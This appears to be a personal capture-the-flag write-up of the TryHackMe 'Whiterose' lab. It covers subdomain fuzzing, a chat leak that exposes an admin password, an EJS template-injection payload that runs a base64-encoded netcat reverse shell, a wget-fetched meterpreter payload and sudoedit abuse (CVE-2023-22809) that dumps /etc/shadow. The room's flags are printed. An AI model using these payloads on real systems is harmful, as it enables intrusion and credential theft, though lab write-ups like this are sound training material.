---
title: "Whiterose"
tags:
  - fetus
---
## given creds:
```
Olivia Cortez:olivi8
```
## nmap results: 
- `nmap -sV -O --script=default 10.10.174.97 -oN Dscan.txt`:
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 15:07 EDT
Nmap scan report for 10.10.174.97
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 609.94 seconds
```
- `Ascan.txt`:
```sh
# Nmap 7.95 scan initiated Wed Apr 16 15:56:01 2025 as: /usr/lib/nmap/nmap -p- -A -T4 -oN Ascan.txt 10.10.174.97
Nmap scan report for cyprusbank.thm (10.10.174.97)
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: nginx/1.14.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   180.10 ms 10.21.0.1
2   180.16 ms cyprusbank.thm (10.10.174.97)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 16 16:11:57 2025 -- 1 IP address (1 host up) scanned in 956.30 seconds
```
## http enum: 
- tried to access directly. doesnt load and the url bar returns this: `http://cyprusbank.thm/`. ill add it to the `/etc/hosts` file ig
- added it. can access the site now. lets see what comes up
- this comes up: <br>
![[WhiteroseDefaultPage.png]]
#### directory busting results: 
- `feroxbuster --url http://cyprusbank.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` gave me nothing. im stuck already lmao. gonna see just a lil bit of a writeup, juuuust enough to see what to do
- oh [[Subdomain Enumeration]]. ofcourse
- used [[ffuf]] for this 
```sh
ffuf -u http://cyprusbank.thm/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.cyprusbank.thm" -fw 1
```
- gave us these two:
```sh
www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 733ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 798ms]
```
- gonna add these to the `/etc/hosts` file as well
- added em. lets check the subdomains 
- `www` is the same site
- `admin` gave us this: <br>
![[WhiteroseAdminPanel.png]]
- lets explore what else this leads to from the navbar
- `Home` is the same page 
- none of the other pages give us anything other 
- now that i've logged in with the creds. each page gives us these: 
- `settings`: <br>
![[WhiteroseSettingsNoPerms.png]]
- `Home`: <br>
![[WhiteroseHomeRedacted1.png]]
![[WhiteroseHomeRedacted2.png]]
- `See all the accounts` leads us to `Search` which gives us this: (I searched for Tyrell) <br>
![[WhiteroseSearchRedactedTyrell.png]]
- `Messages` gives us this: <br>
![[WhiteroseMessagesInitial.png]]
- sent some messages. seems like i can only see 5 messages at a time <br>
![[WhiteroseSearchOnlyFive.png]]
- ooooh notice the URL: `http://admin.cyprusbank.thm/messages/?c=5`
- lets see what happens when we change that shit 
- hey seems like the `c` parameter controls the amount of messages i can see. imma set it to a really high value and see what happens 
- chat log:
```
Cyprus National Bank - Admin Chat

DEV TEAM: Thanks Gayle, can you share your credentials? We need privileged admin account for testing

Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'

DEV TEAM: Alright we are trying to implement chat history, everything should be ready in week or so

Gayle Bev: That's nice to hear!

Gayle Bev: Developers implemented this new messaging feature that I suggested! What you guys think?

Greger Ivayla: Looks really cool!

Jemmy Laurel: Hey have you guys seen Mrs. Jacobs recently??

Olivia Cortez: No she hasn't been around for a while

Jemmy Laurel: Oh, is she OK?

Olivia Cortez: swfawfawgfawg

Olivia Cortez: dwafawfgawfawgwag

Olivia Cortez: 1

Olivia Cortez: 2

Olivia Cortez: 3

Olivia Cortez: 4

Olivia Cortez: 5

```
- huh. new creds found. seems like Gayle is a privilaged admin. so far the complete creds found are:
```
Olivia Cortez:olivi8
Gayle Bev:p~]P@5!6;rs558:q
```
- incomplete creds: 
```
DEV TEAM:
Greger Ivayla:
Jemmy Laurel:
```
- lets login with Gayle's creds 
- hell yeah nothing's redacted anymore <br>![[WhiteroseGayleHome.png]]
- lets get Tyrell's phone number now lmao
```
842-029-5701
```
- `Messages` didnt anything new. nor did `Search`
- ooooooooh `Settings` gives me a register page: <br>
![[WhiteroseSettingsPage.png]]
- lets see what happens if i register a valid user
- `test:test` gave us this: <br>
![[WhiteroseSettingsUpdate.png]]
- reflects the password. lets see what happens if i put in a reverse shell, specificall in there while listening
	- [[pentestMonkey-oneLinerBashShell]] didnt work. gonna try [[pentestMonkey-PHP_reverse_shell]] 
	- didnt work. maybe try with a valid user???
	- nothing works. im gonna have a looksie at the writeup again
	- yapping about SSTI
- fine ill read about SSTI - _ -
	- https://portswigger.net/web-security/server-side-template-injection
	- WOW thats alot of reading. ill get to it later its almost 4am i just wanna solve ts
- lets mess around with the post request in burp
- empty password parameter didnt change anything 
- no password parameter did tho: <br>
![[WhiteroseNoPasswordParameter.png]]
- hmmm i have no idea what this is. another tiiiiiiiiiiny looksie at the writeup 
- hmmmm ejs something something template injection
- gonna do some googling around
	- https://github.com/mde/ejs/issues/720
	- https://eslam.io/posts/ejs-server-side-template-injection-rce/
	- sooooooooo ejs just takes the settings object and treats it like its own config no questions asked. we can do this two ways, setting the delimiter and doing some `<%__%>` block shenanigans. ooooooor we can just set a random option and make a second statement that runs 
	- lets check if it actually runs or not by running something like 
```js
&settings[view%20options][outputFunctionName]=x%3bprocess.mainModule.require('child_process').execSync('curl%20http://10.21.154.145:8081');//
```
- 
	- while an http server is open on my end on port `8081` <br>
	![[WhiteroseHttpRequestGot.png]]
	- WE GOT RCEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
	- FUCK YESSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
- lets get a revshell
```js
&settings[view%20options][outputFunctionName]=x%3bprocess.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC4yMS4xNTQuMTQ1IDEzMzggLWUgc2g= | base64 -d | bash"');//
```
- HELLLLLLLLLLLLLLLLLLLL YEEAAAAAAAAAHHHHHHHHHHHH <br>
![[WhiteroseGotShell.png]] <br>
- `user.txt`:
	
```
THM{4lways_upd4te_uR_d3p3nd3nc!3s}
```
	
- `uname -a`:
```sh
Linux cyprusbank 4.15.0-213-generic #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023 x86_64 GNU/Linux
```
	
- imma try and get a [[meterpreter]] shell with a custom payload made with [[msfvenom]] 
- `msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o whiterose1338.elf LHOST=10.21.154.145 LPORT=1338`
```sh fold title:"muhehehehe"
cd /tmp
wget http://10.21.154.145/whiterose1338.elf
wget http://10.21.154.145:8082/whiterose1338.elf
ls
snap-private-tmp
systemd-private-38a8eb192b424a1a93b01b8ce4a57ed9-systemd-resolved.service-CKb0ZT
systemd-private-38a8eb192b424a1a93b01b8ce4a57ed9-systemd-timesyncd.service-R7AHJs
whiterose1338.elf
```
	
- gave it 777 perms as well
- set up a handler in [[metasploit]] <br>
![[WhiteroseMeterpreterSession.png]] <br>
- HEH
- uploaded [[linpeas.sh]] and ran it 
- oooh red and yellowwwwwwwww: <br>
![[WhiterosePossiblePrivEscVector1.png]] <br>
```
╔══════════╣ PATH                  
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
/home/web/.nvm/versions/node/v17.9.1/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
```
<br> ![[WhiterosePossiblePrivEscVector2.png]] <br>
```sh
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services
/etc/systemd/system/multi-user.target.wants/pm2-web.service is calling this writable executable: /home/web/
/etc/systemd/system/multi-user.target.wants/pm2-web.service is calling this writable executable: /home/web/
/etc/systemd/system/multi-user.target.wants/pm2-web.service is calling this writable executable: /home/web/
/etc/systemd/system/pm2-web.service is calling this writable executable: /home/web/
/etc/systemd/system/pm2-web.service is calling this writable executable: /home/web/
/etc/systemd/system/pm2-web.service is calling this writable executable: /home/web/
```
- another interesting thing: <br>
![[WhiterosePossiblePrivEscVector3.png]] <br>
```sh
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
- SUID stuff:
```sh
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                             
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                     
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44K Nov 29  2022 /bin/su
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 37K Nov 29  2022 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 59K Nov 29  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 1.1M Nov  4  2022 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 75K Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 22K Jan 12  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 40K Nov 29  2022 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 75K Nov 29  2022 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 37K Nov 29  2022 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 44K Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 99K May  5  2023 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 427K Mar 30  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14K Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 128K May 29  2023 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
```
- gonna try `CVE-2019-13272` : https://github.com/jas502n/CVE-2019-13272?tab=readme-ov-file
- uploaded https://github.com/jas502n/CVE-2019-13272/CVE-2019-13272.c to the victim 
- ran `gcc -s CVE-2019-13272.c -o pwned` to compile to `pwned`: <br>
![[WhiterosePwnedHasBeenGenerated.png]] <br>
- didnt work 
- gonna upload `pspy64`
- didnt find anything 
- what do i still have in my backpocket?
	- that sudo edit thing 
	- that other thing 
- lets google those 
- found something for the sudoedit thing. `CVE-2023-22809`
	- `In Sudo before 1.9.12p2, the sudoedit (aka -e) feature mishandles extra arguments passed in the user-provided environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to append arbitrary entries to the list of files to process. This can lead to privilege escalation. Affected versions are 1.8.0 through 1.9.12.p1. The problem exists because a user-specified editor may contain a "--" argument that defeats a protection mechanism, e.g., an EDITOR='vim -- /path/to/extra/file' value.` <br>
	- `sudo --version` <br>
	- `Sudo version 1.9.12p1`
	- OMG its vulnerable 
	- https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis
	- `export EDITOR="vi -- /etc/shadow"` <br>
	- `sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm` 
- output: 
```sh
root:$6$LVAc0zJV$81N7Ge4HhMb/U9A/kaL6Px0vay4rEKfNnrZSVbktE2aQxM6Tudl1/ex6tJq6fYFF
PiOg7WhINFagng4ryejN8e1:19554:0:99999:7:::
daemon:*:18885:0:99999:7:::
bin:*:18885:0:99999:7:::
sys:*:18885:0:99999:7:::
sync:*:18885:0:99999:7:::
games:*:18885:0:99999:7:::
man:*:18885:0:99999:7:::
lp:*:18885:0:99999:7:::
mail:*:18885:0:99999:7:::
news:*:18885:0:99999:7:::
uucp:*:18885:0:99999:7:::
proxy:*:18885:0:99999:7:::
www-data:*:18885:0:99999:7:::
backup:*:18885:0:99999:7:::
list:*:18885:0:99999:7:::
irc:*:18885:0:99999:7:::
gnats:*:18885:0:99999:7:::
nobody:*:18885:0:99999:7:::
systemd-network:*:18885:0:99999:7:::
systemd-resolve:*:18885:0:99999:7:::
syslog:*:18885:0:99999:7:::
messagebus:*:18885:0:99999:7:::
"/var/tmp/shadow.fwMgThT5" 31L, 1052C                         1,1           Top
```
- ah fuck it imma get a tty shell instead
- `nc -nvlp 1337`
- [[python-tty-shell]]
- `^Z`
- `stty raw -echo && fg`
- finally i can work in peace now 
- `root.txt`
```
THM{4nd_uR_p4ck4g3s}
```
- edit the sudoers file to get full sudo and then just do sudo su to get full root 